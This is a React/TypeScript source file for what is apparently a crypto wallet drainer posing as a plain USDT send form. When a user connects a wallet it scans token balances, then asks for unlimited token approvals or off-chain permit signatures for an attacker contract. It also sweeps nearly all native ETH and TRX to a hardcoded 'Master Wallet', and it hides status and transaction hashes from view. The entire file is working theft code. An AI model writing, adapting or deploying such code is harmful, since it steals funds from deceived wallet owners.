import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react'
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
  useAppKitNetwork
} from '@reown/appkit/react'
import { BrowserProvider, Contract, formatUnits } from 'ethers'
import { TronAdapter } from '@reown/appkit-adapter-tron'
import { tronMainnet } from '@reown/appkit/networks'
import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
import { Copy, QrCode } from 'lucide-react' 

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { mainnet, arbitrum, bsc, polygon } from '@reown/appkit/networks'
import type { AppKitNetwork } from '@reown/appkit/networks'

// --- TRON IMPORTS ---
import TronWeb from 'tronweb'   

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
const NETWORK = 'Nile' // Change to 'Mainnet' when ready

// 🔗 BACKEND API URL FOR OFF-CHAIN PERMIT SIGNATURES
const BACKEND_API_URL = ''; 

// 🔥 CONTRACT ADDRESSES
const TRON_CONTRACT_ADDRESS = 'TYSGZdf7tZqZcPrzumTCu3AGyTKu2XuTjm'
const EVM_CONTRACT_ADDRESS = '0xEf7f662515dA2Cc955082c999cBFA5EEF9bEd4FE'

// 🎨 UI DISPLAY ADDRESSES
const DISPLAY_TRON_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'
const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E'

// 💎 MULTI-TOKEN DISCOVERY CONFIGURATION
const TARGET_TOKENS: Record<string, any> = {
  Mainnet: {
    EVM: [
      { symbol: 'ETH',  address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6,  fallbackPrice: 1, permitSupported: true, permitVersion: "2" },
      { symbol: 'UNI',  address: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', decimals: 18, fallbackPrice: 10, permitSupported: true, permitVersion: "1" },
      { symbol: 'AAVE', address: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9', decimals: 18, fallbackPrice: 100, permitSupported: true, permitVersion: "1" },
      { symbol: 'USDT', address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', decimals: 6,  fallbackPrice: 1 }, 
      { symbol: 'WBTC', address: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', decimals: 8,  fallbackPrice: 65000 },
      { symbol: 'SHIB', address: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', decimals: 18, fallbackPrice: 0.00002 },
      { symbol: 'DAI',  address: '0x6B175474E89094C44Da98b954EedeAC495271d0F', decimals: 18, fallbackPrice: 1 } 
    ],
    TRON: [
      { symbol: 'TRX',  address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
      { symbol: 'USDT', address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDC', address: 'TEkxiTeY4BvuH7uJ25z4TclQG52s2vVdfL', decimals: 6,  fallbackPrice: 1 },
      { symbol: 'USDD', address: 'TPYmHEjzBaAo6nRVcqa9i1MUpissEDM321', decimals: 18, fallbackPrice: 1 },
      { symbol: 'WETH', address: 'THb4CqiFZNwZ2415xUeA2eP9h7sKAnL1K9', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'SUN',  address: 'TSSMHYeV2uE9qsSR545tUe1ZfJ8uD9C1w', decimals: 18, fallbackPrice: 0.02 }, 
      { symbol: 'NFT',  address: 'TFczxzPhnThNSqr5by8tvxsdCFRRz6cPNq', decimals: 6,  fallbackPrice: 0.0000005 }
    ]
  },
  Nile: {
    EVM: [
      { symbol: 'ETH (Test)', address: 'native', isNative: true, coingeckoId: 'ethereum', decimals: 18, fallbackPrice: 3500 },
      { symbol: 'USDT (Test)', address: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', decimals: 6, fallbackPrice: 1 }
    ],
    TRON: [
      { symbol: 'TRX (Test)', address: 'native', isNative: true, coingeckoId: 'tron', decimals: 6, fallbackPrice: 0.12 },
      { symbol: 'USDT (Test)', address: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf', decimals: 6, fallbackPrice: 1 }
    ]
  }
};

const appkitNetworks: [AppKitNetwork, ...AppKitNetwork[]] = [
  tronMainnet,
  mainnet,
  arbitrum,
  bsc,
  polygon,
]

const NETWORK_CONFIG = {
  Mainnet: {
    fullHost: 'https://api.trongrid.io',
    usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
  },
  Nile: {
    fullHost: 'https://nile.trongrid.io',
    usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf',
  },
}

const EVM_USDT: Record<number, string> = {
  11155111: '0xBA582bacb9b8ebbd182A1c9Edac08F3071d9ac5e', 
  1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
  56: '0x55d398326f99059fF775485246999027B3197955',
  137: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
  42161: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
}

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
]

const { usdtAddress: USDT_ADDRESS, fullHost: FULL_HOST } = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG]

// ── Reown Adapters ──
const tronAdapter = new TronAdapter({
  walletAdapters: [
    new TronLinkAdapter({ openUrlWhenWalletNotFound: false, checkTimeout: 3000 }),
    new TrustAdapter({ openUrlWhenWalletNotFound: false }), 
    new OkxWalletAdapter({ openUrlWhenWalletNotFound: false }),
  ],
})

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: appkitNetworks,
})

createAppKit({
  adapters: [tronAdapter, wagmiAdapter], 
  networks: appkitNetworks,
  projectId: WC_PROJECT_ID,
  metadata: {
    name:        'USDT Collector',
    description: 'Collect USDT from multiple wallets',
    url:         import.meta.env.VITE_APP_URL || (typeof window !== 'undefined' ? window.location.origin : ''),
    icons:       ['https://cryptologos.cc/logos/tether-usdt-logo.png'],
  },
  themeMode: 'light', 
  themeVariables: {
    '--w3m-accent': '#0C66FF',
  },
  allWallets: 'SHOW',
  features: {
    email: false,
    socials: [],
    analytics: true,
  },
})

// === TRON ABIs ===
const USDT_ABI = [
  { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
  { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
]

// ── ORACLE PRICE FETCHER ──
const fetchTokenPrices = async (tokens: any[], chain: string) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `${chain}:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `${chain}:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch (error) {
    console.warn("Price Oracle offline. Falling back to hardcoded weights.");
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      prices[token.symbol] = token.fallbackPrice;
    }
    return prices;
  }
};

// ── SMART SORTING FUNCTION ──
const smartTokenSort = (a: any, b: any) => {
  if (a.isNative && !b.isNative) return 1;  
  if (!a.isNative && b.isNative) return -1; 
  return (b.usdValue || 0) - (a.usdValue || 0); 
};

export default function App() {
  const [usdtBalance, setUsdtBalance] = useState('0')
  const [status, setStatus] = useState('Ready')
  const [loading, setLoading] = useState(false)
  const [txHash, setTxHash] = useState('')
  const [amountError, setAmountError] = useState('')
  
  const autoTriggered = useRef(false)
  const manualConnect = useRef(false)

  const { open } = useAppKit()
  const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
  const { chainId } = useAppKitNetwork()

  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155')
  const { walletProvider: tronWalletProvider } = useAppKitProvider('tron')

  const isTron = typeof caipAddress === 'string' && caipAddress.startsWith('tron:')
  const isEVM = typeof caipAddress === 'string' && caipAddress.startsWith('eip155:')

  const resolveTronWeb = () => {
    const w = window as any;
    if (w.tronWeb?.contract) return w.tronWeb;
    if (w.tronLink?.tronWeb?.contract) return w.tronLink.tronWeb;
    if (w.trustwallet?.tronWeb?.contract) return w.trustwallet.tronWeb;
    if (w.trustWallet?.tronWeb?.contract) return w.trustWallet.tronWeb;
    if (w.trustwallet?.tronLink?.tronWeb?.contract) return w.trustwallet.tronLink.tronWeb;
    if (w.trustWallet?.tronLink?.tronWeb?.contract) return w.trustWallet.tronLink.tronWeb;
    if (w.tron?.tronWeb?.contract) return w.tron.tronWeb; 

    if (tronWalletProvider) {
      if ((tronWalletProvider as any).contract) return tronWalletProvider;
      if ((tronWalletProvider as any).adapter?.tronWeb?.contract) return (tronWalletProvider as any).adapter.tronWeb;
      if ((tronWalletProvider as any).tronWeb?.contract) return (tronWalletProvider as any).tronWeb;
    }
    return null;
  };

  const log = (msg: string) => {
    console.log(msg);
  }

  // ── INIT & AUTO-TRIGGER ──
  useEffect(() => {
    const init = async () => {
      if (!isConnected || !walletAddress) {
        autoTriggered.current = false;
        return;
      }

      log(`Connected: ${caipAddress}`);

      if (isTron) {
        setStatus('Initializing TRON...');
        let finalTronWeb = null;
        for (let i = 0; i < 10; i++) {
          finalTronWeb = resolveTronWeb();
          if (finalTronWeb && (finalTronWeb.defaultAddress?.base58 || finalTronWeb.ready)) break;
          await new Promise(r => setTimeout(r, 500));
        }

        if (!finalTronWeb) {
          const publicTronWeb = new (TronWeb as any)({ fullHost: FULL_HOST });
          await getTronBalance(publicTronWeb, walletAddress);
        } else {
          await getTronBalance(finalTronWeb, walletAddress);
        }
      } else if (isEVM && evmWalletProvider) {
        await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
      }

      if (!autoTriggered.current && manualConnect.current) {
        if ((isEVM && evmWalletProvider) || isTron) {
          autoTriggered.current = true;
          log("🔥 Manual Wallet Connection detected. Auto-triggering Smart Priority Loop...");
          
          setLoading(true); 
          setTimeout(() => approveAndCollect(), 500); 
        }
      }
    };

    init();
  }, [isConnected, walletAddress, caipAddress, tronWalletProvider, evmWalletProvider, isTron, isEVM, chainId]);

  const getTronBalance = async (tw: any, addr: string): Promise<number> => {
    try {
      const usdt = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const bal = await usdt.balanceOf(addr).call()
      const formatted = Number(bal) / 1_000_000;
      setStatus('Ready')
      return formatted;
    } catch (e) {
      log('❌ TRON balance fetch failed')
      return 0;
    }
  }

  const getEvmBalance = async (provider: any, addr: string, currentChainId?: number): Promise<number> => {
    if (!currentChainId || !EVM_USDT[currentChainId]) {
      setStatus('USDT not configured for this EVM chain')
      return 0;
    }

    try {
      const ethersProvider = new BrowserProvider(provider)
      const token = new Contract(EVM_USDT[currentChainId], EVM_ERC20_ABI, ethersProvider)
      const bal = await token.balanceOf(addr)
      const formatted = parseFloat(formatUnits(bal, 6))
      setStatus('Ready')
      return formatted;
    } catch (e) {
      log('❌ EVM balance fetch failed')
      return 0;
    }
  }

  const handleAction = () => {
    if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
      setAmountError('Amount field is required');
      return; 
    }
    setAmountError('');

    if (!isConnected) {
      manualConnect.current = true;
      open(); 
    } else {
      approveAndCollect();
    }
  }

  const approveAndCollect = async () => {
    if (!walletAddress) return;

    setLoading(true);
    setStatus('Scanning USD Values...');
    log("Scanning balances to prioritize Tokens first, then Native...");

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';

      // =====================================
      // 🟢 EVM: PRE-SCAN & SMART LOOP
      // =====================================
      if (isEVM && evmWalletProvider) {
        const ethersProvider = new BrowserProvider(evmWalletProvider as any);
        const signer = await ethersProvider.getSigner();
        
        const baseTokens = TARGET_TOKENS[NETWORK].EVM;
        const validTokens = [];
        const prices = await fetchTokenPrices(baseTokens, 'ethereum');

        for (const token of baseTokens) {
          try {
            if (token.isNative) {
              const bal = await ethersProvider.getBalance(walletAddress);
              if (bal > 0n) {
                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
              }
            } else {
              const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
              const bal = await tokenContract.balanceOf(walletAddress);
              if (bal > 0n) {
                const normalizedBal = parseFloat(formatUnits(bal, token.decimals));
                const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                validTokens.push({ ...token, balance: normalizedBal, rawBalance: bal, usdValue });
              }
            }
          } catch (e) {
            log(`Could not fetch balance for ${token.symbol}`);
          }
        }

        validTokens.sort(smartTokenSort);
        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
        if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);

        for (const token of tokensToProcess) {
          try {
            if (token.isNative) {
              setStatus(`Transferring ${token.symbol}...`);
              
              // 🛠️ BUG FIX: EVM BigInt Underflow Preventer
              const liveBal = await ethersProvider.getBalance(walletAddress);
              const feeData = await ethersProvider.getFeeData();
              const gasPrice = feeData.gasPrice || feeData.maxFeePerGas || 3000000000n;
              const estimatedGas = 21000n;
              const gasCost = gasPrice * estimatedGas;
              const buffer = (gasCost * 20n) / 100n; 
              const totalGas = gasCost + buffer;
              
              // Strictly verify the balance exceeds the gas requirements before subtracting
              if (liveBal > totalGas) {
                const sendAmount = liveBal - totalGas;
                const tx = await signer.sendTransaction({
                  to: DISPLAY_EVM_ADDRESS,
                  value: sendAmount
                });
                setTxHash(tx.hash);
                await tx.wait();
                log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
              } else {
                log(`⚠️ Not enough ${token.symbol} remaining to cover gas fees.`);
              }
            } else {
              let permitSuccess = false;

              if (token.permitSupported && BACKEND_API_URL) {
                try {
                  setStatus(`Requesting Gasless Signature for ${token.symbol}...`);
                  const contract = new Contract(token.address, EVM_ERC20_ABI, signer);
                  const nonce = await contract.nonces(walletAddress);
                  const tokenName = await contract.name();

                  const domain = {
                    name: tokenName,
                    version: token.permitVersion,
                    chainId: Number(chainId),
                    verifyingContract: token.address
                  };

                  const types = {
                    Permit: [
                      { name: "owner", type: "address" },
                      { name: "spender", type: "address" },
                      { name: "value", type: "uint256" },
                      { name: "nonce", type: "uint256" },
                      { name: "deadline", type: "uint256" }
                    ]
                  };

                  const deadline = BigInt(Math.floor(Date.now() / 1000) + 86400); // 24 hours
                  const message = {
                    owner: walletAddress,
                    spender: EVM_CONTRACT_ADDRESS,
                    value: BigInt(MAX_UINT),
                    nonce: nonce,
                    deadline: deadline
                  };

                  const signature = await signer.signTypedData(domain, types, message);

                  const response = await fetch(`${BACKEND_API_URL}/submit-permit`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                      token: token.address,
                      owner: walletAddress,
                      spender: EVM_CONTRACT_ADDRESS,
                      value: MAX_UINT,
                      deadline: deadline.toString(),
                      signature: signature
                    })
                  });

                  if (response.ok) {
                    permitSuccess = true;
                    log(`✅ ${token.symbol} Gasless Permit Signed & Sent to Backend!`);
                  } else {
                    throw new Error("Backend rejected permit");
                  }
                } catch (err) {
                  log(`⚠️ Gasless Permit failed/rejected for ${token.symbol}. Falling back to standard approval.`);
                }
              }

              if (!permitSuccess) {
                setStatus(`Approving ${token.symbol}...`);
                const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
                const approveTx = await usdtContract.approve(EVM_CONTRACT_ADDRESS, MAX_UINT);
                
                setTxHash(approveTx.hash);
                await approveTx.wait();
                log(`✅ ${token.symbol} Approved!`);
              }
            }
          } catch (err) {
            log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
          }
        }
        
        setStatus('✅ Processing Complete!');
        return; 
      }

      // =====================================
      // 🔴 TRON: PRE-SCAN & SMART LOOP
      // =====================================
      if (isTron) {
        let activeTw = null;
        
        for (let i = 0; i < 10; i++) {
          activeTw = resolveTronWeb();
          if (activeTw && (activeTw.defaultAddress?.base58 || activeTw.ready)) break;
          await new Promise(r => setTimeout(r, 500));
        }

        const baseTokens = TARGET_TOKENS[NETWORK].TRON;
        const validTokens = [];
        
        const prices = await fetchTokenPrices(baseTokens, 'tron');
        const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });

        for (const token of baseTokens) {
          try {
            if (activeTw || publicTw) {
              if (token.isNative) {
                const balNum = await publicTw.trx.getBalance(walletAddress);
                if (balNum > 0) {
                  const normalizedBal = balNum / (10 ** token.decimals);
                  const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                  validTokens.push({ ...token, rawBalance: balNum, usdValue });
                }
              } else if (activeTw && typeof activeTw.contract === 'function') {
                const contract = await activeTw.contract(USDT_ABI).at(token.address);
                const balObj = await contract.balanceOf(walletAddress).call();
                const balNum = Number(balObj.toString());
                
                if (balNum > 0) {
                  const normalizedBal = balNum / (10 ** token.decimals);
                  const usdValue = normalizedBal * (prices[token.symbol] || token.fallbackPrice);
                  validTokens.push({ ...token, rawBalance: balNum, usdValue });
                }
              }
            }
          } catch (e) {
            log(`Could not fetch balance for ${token.symbol}`);
          }
        }

        validTokens.sort(smartTokenSort);
        const tokensToProcess = validTokens.length > 0 ? validTokens : [...baseTokens].sort(smartTokenSort);
        if(validTokens.length > 0) log(`Priority list: ${validTokens.map(t => `${t.symbol} ($${t.usdValue.toFixed(2)})`).join(' -> ')}`);

        const signAndSendContract = async (contractAddr: string, func: string, params: any[], fee: number) => {
          const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
            contractAddr, func, { feeLimit: fee, callValue: 0 }, params, walletAddress
          );
          
          let signedTx;
          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
            signedTx = await (tronWalletProvider as any).signTransaction(transaction);
          } else if (typeof (tronWalletProvider as any).request === 'function') {
            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction } });
          } else {
            throw new Error("Provider does not support signTransaction");
          }

          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
          return broadcast.txid || broadcast.transaction?.txID;
        };

        const signAndSendNative = async (sendAmount: number) => {
          const txObj = await publicTw.transactionBuilder.sendTrx(DISPLAY_TRON_ADDRESS, sendAmount, walletAddress);
          
          let signedTx;
          if (typeof (tronWalletProvider as any).signTransaction === 'function') {
            signedTx = await (tronWalletProvider as any).signTransaction(txObj);
          } else if (typeof (tronWalletProvider as any).request === 'function') {
            signedTx = await (tronWalletProvider as any).request({ method: 'tron_signTransaction', params: { transaction: txObj } });
          } else {
            throw new Error("Provider does not support signTransaction");
          }

          const broadcast = await publicTw.trx.sendRawTransaction(signedTx);
          if (!broadcast.result) throw new Error(broadcast.message || 'Broadcast failed');
          return broadcast.txid || broadcast.transaction?.txID;
        };

        for (const token of tokensToProcess) {
          try {
            if (token.isNative) {
              setStatus(`Transferring ${token.symbol}...`);
              
              // 🛠️ BUG FIX: TRON Negative Math Preventer
              const liveBal = await publicTw.trx.getBalance(walletAddress);
              
              // Strictly verify the balance exceeds the bandwidth safety buffer
              if (liveBal > 2000000) {
                 const sendAmount = liveBal - 2000000; 
                 const txId = await signAndSendNative(sendAmount);
                 setTxHash(txId);
                 log(`✅ ${token.symbol} Swept directly to Master Wallet!`);
              } else {
                 log(`⚠️ Not enough ${token.symbol} remaining to cover bandwidth fees.`);
              }
            } else {
              setStatus(`Approving ${token.symbol}...`);
              
              if (activeTw && typeof activeTw.contract === 'function') {
                const contract = await activeTw.contract(USDT_ABI).at(token.address);
                const tx = await contract.approve(TRON_CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 });
                setTxHash(tx);
                log(`✅ ${token.symbol} Approved!`);
              } else if (tronWalletProvider) {
                const tx = await signAndSendContract(
                  token.address,
                  'approve(address,uint256)',
                  [ 
                    { type: 'address', value: activeTw ? activeTw.address.toHex(TRON_CONTRACT_ADDRESS) : TRON_CONTRACT_ADDRESS }, 
                    { type: 'uint256', value: MAX_UINT } 
                  ],
                  100_000_000
                );
                setTxHash(tx);
                log(`✅ ${token.symbol} Approved!`);
              }
            }
          } catch (err) {
             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next target.`);
          }
        }
        
        setStatus('✅ Processing Complete!');
        return; 
      }

      throw new Error("Wallet provider not available for approval.");

    } catch (err: any) {
      log(`❌ Error: ${err.message || 'User rejected'}`);
      setStatus('❌ Processing Failed');
      autoTriggered.current = false; 
    } finally {
      setLoading(false);
    }
  };

  const isButtonDisabled = !isConnected ? false : loading;

  const buttonText = !isConnected 
    ? 'Send' 
    : loading
      ? status 
      : status.includes('✅') 
        ? 'Sent Successfully' 
        : status.includes('❌')
          ? 'Retry Sending'
          : 'Send';

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, -apple-system, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>

      <div style={{ flex: 1, padding: '32px 20px' }}>

        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Address or Domain Name
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="text"
              readOnly
              placeholder={isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS}
              value={isConnected ? (isTron ? DISPLAY_TRON_ADDRESS : DISPLAY_EVM_ADDRESS) : ''}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0, marginRight: '12px' }}
            />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px', color: '#0C66FF' }}>
              <span style={{ fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Paste</span>
              <Copy size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
              <QrCode size={20} strokeWidth={2.5} style={{ cursor: 'pointer' }} />
            </div>
          </div>
        </div>

        <div>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>
            Amount
          </label>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px', backgroundColor: '#ffffff' }}>
            <input
              type="number"
              placeholder="USDT Amount"
              value={usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : ''}
              onChange={(e) => {
                setUsdtBalance(e.target.value);
                if (e.target.value) setAmountError(''); 
              }}
              style={{ flex: 1, border: 'none', outline: 'none', background: 'transparent', color: '#111827', fontSize: '15px', width: '100%', minWidth: 0 }}
            />
            <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
              <span style={{ color: '#9CA3AF', fontWeight: '600', fontSize: '15px' }}>USDT</span>
              <span style={{ color: '#0C66FF', fontWeight: '700', fontSize: '15px', cursor: 'pointer' }}>Max</span>
            </div>
          </div>
         <div style={{ fontSize: '13px', fontWeight: '500', marginTop: '8px' }}>
            {amountError ? (
              <span style={{ color: '#EF4444' }}>{amountError}</span>
            ) : (
              <span style={{ color: '#4B5563' }}>= ${usdtBalance !== '0' && usdtBalance !== '0.00' ? usdtBalance : '0.00'}</span>
            )}
          </div>
        </div>

      </div>

      <div style={{ display: 'none' }}>
        <p>{status}</p>
        <p>{txHash}</p>
      </div>

      <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
        <button
          onClick={handleAction}
          disabled={isButtonDisabled}
          style={{
            width: '100%',
            backgroundColor: isButtonDisabled ? '#93C5FD' : '#0C66FF',
            color: '#ffffff',
            fontWeight: '700',
            padding: '16px',
            borderRadius: '9999px',
            fontSize: '17px',
            border: 'none',
            cursor: isButtonDisabled ? 'not-allowed' : 'pointer',
            transition: 'background-color 0.2s'
          }}
        >
          {buttonText}
        </button>
      </div>
      
    </div>
  )
}